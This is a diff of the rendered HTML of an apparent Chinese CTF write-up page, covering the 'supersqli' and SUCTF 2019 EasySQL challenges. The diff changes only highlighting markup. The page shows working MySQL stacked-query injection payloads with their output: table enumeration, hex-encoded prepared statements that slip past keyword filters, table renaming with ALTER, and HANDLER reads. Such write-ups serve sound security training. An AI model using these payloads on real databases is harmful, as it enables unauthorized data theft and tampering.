+</span><span class="w">  </span><span class="nf">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="w"> </span><span class="s2">&#34;supersqli&#34;</span><span class="w">
+</span><span class="w"></span><span class="err">}</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nf">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span><span class="w">  </span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span><span class="w">
+</span><span class="w">  </span><span class="nf">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="s2">&#34;test&#34;</span><span class="w">
+</span><span class="w"></span><span class="err">}</span><span class="w">
+</span></code></pre></td></tr></table></div>
 </div>
 </div><ol start="5">
 <li>查询当前数据库的表名：<code>1'; show tables;#</code></li>
 </ol>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -672,7 +672,7 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
   <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
   <span class="n">string</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="s2">&#34;1919810931114514&#34;</span>
 <span class="p">}</span>
@@ -689,37 +689,37 @@
 </ol>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="s1">&#39;; show columns from words ;#
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="s1">&#39;; show columns from words ;#
 </span><span class="s1">
 </span><span class="s1">#当表名为数字时需要用 反引号 `` 包起来查询
-</span><span class="s1">1&#39;</span><span class="p">;</span> <span class="k">show</span> <span class="n">columns</span> <span class="k">from</span> <span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span> <span class="p">;</span><span class="c1">#
+</span><span class="s1">1&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="p">;</span><span class="c1">#
 </span></code></pre></td></tr></table></div>
 </div>
 </div><p><font color=#A020F0>其他注入方法：</font></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># desc table_name 
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># desc table_name 
 </span><span class="c1">#可以用来查看表结构详细信息，此处desc是describe的缩写
-</span><span class="c1"></span>
-<span class="s1">&#39;; desc `1919810931114514` ;#
+</span><span class="c1"></span><span class="w">
+</span><span class="w"></span><span class="s1">&#39;; desc `1919810931114514` ;#
 </span></code></pre></td></tr></table></div>
 </div>
 </div><p>在表 <strong>'1919810931114514'</strong> 查询到 flag字段</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -735,7 +735,7 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">array</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">array</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
   <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
   <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;flag&#34;</span>
   <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
@@ -756,57 +756,57 @@
 <p>预编译相关语法：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="kt">set</span> <span class="o">@</span><span class="n">var_name</span> <span class="o">=</span> <span class="n">expr</span> <span class="p">[,</span> <span class="o">@</span><span class="n">var_name</span> <span class="o">=</span> <span class="n">expr</span><span class="p">]</span> <span class="p">...</span>              <span class="err">用于设置变量名和值</span>
-<span class="n">PREPARE</span> <span class="n">stmt_name</span> <span class="k">FROM</span> <span class="n">preparable_stmt</span><span class="p">;</span>      <span class="err">用于预备一个语句，并赋予名称，以后可以引用该语句</span>
-<span class="n">EXECUTE</span> <span class="n">stmt_name</span> <span class="p">[</span><span class="k">USING</span> <span class="o">@</span><span class="n">var_name</span> <span class="p">[,</span> <span class="o">@</span><span class="n">var_name</span><span class="p">]</span> <span class="p">...];</span>	   <span class="err">执行语句</span>
-<span class="err">{</span><span class="n">DEALLOCATE</span> <span class="o">|</span> <span class="k">DROP</span><span class="err">}</span> <span class="n">PREPARE</span> <span class="n">stmt_name</span><span class="p">;</span>	                   <span class="err">用来释放掉预处理的语句</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="kt">set</span><span class="w"> </span><span class="o">@</span><span class="n">var_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">expr</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="o">@</span><span class="n">var_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">expr</span><span class="p">]</span><span class="w"> </span><span class="p">...</span><span class="w">              </span><span class="err">用于设置变量名和值</span><span class="w">
+</span><span class="w"></span><span class="n">PREPARE</span><span class="w"> </span><span class="n">stmt_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">preparable_stmt</span><span class="p">;</span><span class="w">      </span><span class="err">用于预备一个语句，并赋予名称，以后可以引用该语句</span><span class="w">
+</span><span class="w"></span><span class="n">EXECUTE</span><span class="w"> </span><span class="n">stmt_name</span><span class="w"> </span><span class="p">[</span><span class="k">USING</span><span class="w"> </span><span class="o">@</span><span class="n">var_name</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="o">@</span><span class="n">var_name</span><span class="p">]</span><span class="w"> </span><span class="p">...];</span><span class="w">	   </span><span class="err">执行语句</span><span class="w">
+</span><span class="w"></span><span class="err">{</span><span class="n">DEALLOCATE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">DROP</span><span class="err">}</span><span class="w"> </span><span class="n">PREPARE</span><span class="w"> </span><span class="n">stmt_name</span><span class="p">;</span><span class="w">	                   </span><span class="err">用来释放掉预处理的语句</span><span class="w">
+</span></code></pre></td></tr></table></div>
 </div>
 </div><p>payload:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="s1">&#39;; SET @A = concat(&#39;</span><span class="n">se</span><span class="s1">&#39;,&#39;</span><span class="n">lect</span> <span class="o">*</span> <span class="k">from</span> <span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span> <span class="p">;</span><span class="s1">&#39;) ; prepare stmt from @A ; execute stmt; #
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="s1">&#39;; SET @A = concat(&#39;</span><span class="n">se</span><span class="s1">&#39;,&#39;</span><span class="n">lect</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="p">;</span><span class="s1">&#39;) ; prepare stmt from @A ; execute stmt; #
 </span><span class="s1">
 </span><span class="s1"># 编码成16进制绕过
-</span><span class="s1">&#39;</span><span class="p">;</span> <span class="kt">SET</span> <span class="o">@</span><span class="n">A</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x73656c656374202a2066726f6d206031393139383130393331313134353134603b</span> <span class="p">;</span> <span class="n">prepare</span> <span class="n">stmt</span> <span class="k">from</span> <span class="o">@</span><span class="n">A</span> <span class="p">;</span> <span class="n">execute</span> <span class="n">stmt</span><span class="p">;</span> <span class="c1">#
-</span><span class="c1"></span>
-</code></pre></td></tr></table></div>
+</span><span class="s1">&#39;</span><span class="p">;</span><span class="w"> </span><span class="kt">SET</span><span class="w"> </span><span class="o">@</span><span class="n">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x73656c656374202a2066726f6d206031393139383130393331313134353134603b</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">prepare</span><span class="w"> </span><span class="n">stmt</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">@</span><span class="n">A</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">stmt</span><span class="p">;</span><span class="w"> </span><span class="c1">#
+</span><span class="c1"></span><span class="w">
+</span></code></pre></td></tr></table></div>
 </div>
 </div><h4 id="font-colorffa500方法二使用-alter关键字修改表名字段名font"><a href="#font-colorffa500方法二使用-alter关键字修改表名字段名font" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colorffa500方法二使用-alter关键字修改表名字段名font" class="headings"><font color=#FFA500>方法二：<strong>使用 alter关键字修改表名、字段名</strong></font></a></h4>
 <p>alter语法：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="err">修改表名</span><span class="p">(</span><span class="err">将表名</span><span class="n">user改为users</span><span class="p">)</span>
-<span class="k">alter</span> <span class="k">table</span> <span class="k">user</span> <span class="k">rename</span> <span class="k">to</span> <span class="n">users</span><span class="p">;</span>
-
-<span class="err">修改列名</span><span class="p">(</span><span class="err">将字段名</span><span class="n">username改为name</span><span class="p">)</span>
-<span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">change</span> <span class="n">uesrname</span> <span class="n">name</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="err">修改表名</span><span class="p">(</span><span class="err">将表名</span><span class="n">user改为users</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">rename</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">修改列名</span><span class="p">(</span><span class="err">将字段名</span><span class="n">username改为name</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">change</span><span class="w"> </span><span class="n">uesrname</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span><span class="w">
+</span></code></pre></td></tr></table></div>
 </div>
 </div><p>payload:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -815,11 +815,11 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">alter</span> <span class="k">table</span> <span class="n">words</span> <span class="k">rename</span> <span class="k">to</span> <span class="n">word1</span><span class="p">;</span>
-<span class="k">alter</span> <span class="k">table</span> <span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span> <span class="k">rename</span> <span class="k">to</span> <span class="n">word</span><span class="p">;</span>
-<span class="k">alter</span> <span class="k">table</span> <span class="n">words</span> <span class="k">change</span> <span class="n">flag</span> <span class="n">id</span> <span class="kt">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>
-
-<span class="c1"># 合并payload
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">rename</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">word1</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">rename</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">word</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">alter</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">words</span><span class="w"> </span><span class="k">change</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="c1"># 合并payload
 </span><span class="c1"></span><span class="s1">&#39;;alter table words rename to word1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);
 </span><span class="s1">
 </span></code></pre></td></tr></table></div>
@@ -831,7 +831,7 @@
 <p>handler 语法：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -845,24 +845,24 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">HANDLER</span> <span class="n">tbl_name</span> <span class="n">OPEN</span> <span class="p">[</span> <span class="p">[</span><span class="k">AS</span><span class="p">]</span> <span class="n">alias</span><span class="p">]</span>
- 
-<span class="n">HANDLER</span> <span class="n">tbl_name</span> <span class="k">READ</span> <span class="n">index_name</span> <span class="err">{</span> <span class="o">=</span> <span class="o">|</span> <span class="o">&lt;=</span> <span class="o">|</span> <span class="o">&gt;=</span> <span class="o">|</span> <span class="o">&lt;</span> <span class="o">|</span> <span class="o">&gt;</span> <span class="err">}</span> <span class="p">(</span><span class="n">value1</span><span class="p">,</span><span class="n">value2</span><span class="p">,...)</span>
-    <span class="p">[</span> <span class="k">WHERE</span> <span class="n">where_condition</span> <span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="p">...</span> <span class="p">]</span>
-
-<span class="n">HANDLER</span> <span class="n">tbl_name</span> <span class="k">READ</span> <span class="n">index_name</span> <span class="err">{</span> <span class="n">FIRST</span> <span class="o">|</span> <span class="n">NEXT</span> <span class="o">|</span> <span class="n">PREV</span> <span class="o">|</span> <span class="n">LAST</span> <span class="err">}</span>
-    <span class="p">[</span> <span class="k">WHERE</span> <span class="n">where_condition</span> <span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="p">...</span> <span class="p">]</span>
-
-<span class="n">HANDLER</span> <span class="n">tbl_name</span> <span class="k">READ</span> <span class="err">{</span> <span class="n">FIRST</span> <span class="o">|</span> <span class="n">NEXT</span> <span class="err">}</span>
-    <span class="p">[</span> <span class="k">WHERE</span> <span class="n">where_condition</span> <span class="p">]</span> <span class="p">[</span><span class="k">LIMIT</span> <span class="p">...</span> <span class="p">]</span>
- 
-<span class="n">HANDLER</span> <span class="n">tbl_name</span> <span class="n">CLOSE</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">HANDLER</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="n">OPEN</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="p">[</span><span class="k">AS</span><span class="p">]</span><span class="w"> </span><span class="n">alias</span><span class="p">]</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="n">HANDLER</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">READ</span><span class="w"> </span><span class="n">index_name</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="err">}</span><span class="w"> </span><span class="p">(</span><span class="n">value1</span><span class="p">,</span><span class="n">value2</span><span class="p">,...)</span><span class="w">
+</span><span class="w">    </span><span class="p">[</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">where_condition</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="k">LIMIT</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">HANDLER</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">READ</span><span class="w"> </span><span class="n">index_name</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">FIRST</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NEXT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PREV</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">LAST</span><span class="w"> </span><span class="err">}</span><span class="w">
+</span><span class="w">    </span><span class="p">[</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">where_condition</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="k">LIMIT</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">HANDLER</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="k">READ</span><span class="w"> </span><span class="err">{</span><span class="w"> </span><span class="n">FIRST</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">NEXT</span><span class="w"> </span><span class="err">}</span><span class="w">
+</span><span class="w">    </span><span class="p">[</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">where_condition</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="k">LIMIT</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="n">HANDLER</span><span class="w"> </span><span class="n">tbl_name</span><span class="w"> </span><span class="n">CLOSE</span><span class="w">
+</span></code></pre></td></tr></table></div>
 </div>
 </div><p>payload:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -870,12 +870,12 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="s1">&#39;; handler `1919810931114514` open as `a`; handler `a` read first;#
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="s1">&#39;; handler `1919810931114514` open as `a`; handler `a` read first;#
 </span><span class="s1">
 </span><span class="s1">#或
-</span><span class="s1">1&#39;</span><span class="p">;</span> <span class="n">handler</span> <span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span> <span class="n">open</span><span class="p">;</span> <span class="n">handler</span> <span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span> <span class="k">read</span> <span class="n">first</span><span class="p">;</span><span class="c1">#
-</span><span class="c1"></span>
-<span class="c1">#以上都能得到flag，还可以根据handler语法进行变换。
+</span><span class="s1">1&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="n">open</span><span class="p">;</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">`</span><span class="mi">1919810931114514</span><span class="o">`</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="n">first</span><span class="p">;</span><span class="c1">#
+</span><span class="c1"></span><span class="w">
+</span><span class="w"></span><span class="c1">#以上都能得到flag，还可以根据handler语法进行变换。
 </span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="font-color0288d1-suctf-2019easysqlfont"><a href="#font-color0288d1-suctf-2019easysqlfont" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-color0288d1-suctf-2019easysqlfont" class="headings"><font color=#0288D1> 【SUCTF 2019】EasySQL</font></a></h2>
@@ -892,25 +892,25 @@
 </ol>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctf</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctftraining</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">information_schema</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">mysql</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">performance_schema</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">test</span> <span class="p">)</span> 
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctf</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctftraining</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">information_schema</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">mysql</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">performance_schema</span> <span class="p">)</span> <span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">test</span> <span class="p">)</span> 
 </code></pre></td></tr></table></div>
 </div>
 </div><ol start="2">
 <li>获取表名：<code>query=1; show tables# </code></li>
 </ol>
-<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) 
+<pre tabindex="0"><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) 
 </code></pre><p>flag 是放在 Flag表中的，但是查询关键字都被过滤了。</p>
 <p><strong>一、非预期解</strong>：输入 *,1 就查询出flag了，出题人忘记过滤 * 了</p>
 <p>通过</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
